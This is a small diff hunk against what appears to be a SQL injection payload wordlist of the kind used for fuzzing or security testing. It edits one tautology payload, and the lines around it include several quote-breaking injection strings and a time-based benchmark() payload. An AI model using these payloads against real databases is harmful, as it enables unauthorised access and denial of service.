@@ -50,7 +50,7 @@ hi' or 'a'='a
 21 %
 limit
  or 1=1
- or 2 > 1
+' or 2 > 1
 ")) or benchmark(10000000,MD5(1))#
 PRINT
 hi') or ('a'='a
